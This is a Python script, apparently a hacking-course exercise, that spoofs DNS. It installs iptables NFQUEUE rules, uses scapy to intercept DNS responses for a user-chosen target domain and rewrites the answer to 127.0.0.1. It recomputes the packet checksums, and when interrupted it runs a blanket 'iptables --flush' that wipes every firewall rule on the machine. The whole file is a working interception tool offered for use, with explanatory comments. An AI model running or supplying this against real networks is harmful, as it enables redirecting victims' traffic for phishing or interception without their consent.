#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# to delete the iptables rule... iptables --flush

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse

def get_arguement():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target",help="Target website")
    (options,args) = parser.parse_args()
    return options

subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # FORWARD chain for packets going through the box, INPUT for packets coming into the box, OUTPUT for packets going out of the box.
subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # FORWARD chain for packets going through the box, INPUT for packets coming into the box, OUTPUT for packets going out of the box.

def process_packet(packet):
    option = get_arguement()
    target = option.target
    scapy_packet = scapy.IP(packet.get_payload()) # convert the packet to a scapy packet
    if scapy_packet.haslayer(scapy.DNSRR): # DNSRR=DNS response, DNSRQ=DNS request
        qname = scapy_packet[scapy.DNSQR].qname
        if target in qname: # arachnids.myspecies.info
            print("[+] Spoofing "+target)
            answer=scapy.DNSRR(rrname=qname, rdata="127.0.0.1")
            scapy_packet[scapy.DNS].an=answer # scapy_packet[scapy.DNS].an=answer
            scapy_packet[scapy.DNS].ancount = 1 # parameter that gives count of answers
            del scapy_packet[scapy.IP].len # delete the field then while forwarding the packet scapy will automatically calculate it
            del scapy_packet[scapy.IP].chksum # chksum is used to ensure that the packet has not been modified. Delete the field then while forwarding the packet scapy will automatically calculate it
            del scapy_packet[scapy.UDP].chksum # delete the field then while forwarding the packet scapy will automatically calculate it
            del scapy_packet[scapy.UDP].len # delete the field then while forwarding the packet scapy will automatically calculate it
            packet.set_payload(str(scapy_packet)) # set the payload of the packet to the modified scapy packet.
    packet.accept() # forward the packet to target or packet.drop() to drop the packet
option = get_arguement()
target = option.target
if not target:
    print("Enter target using -t.\n-h for help menu")
    exit()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("\niptables rules are deleted")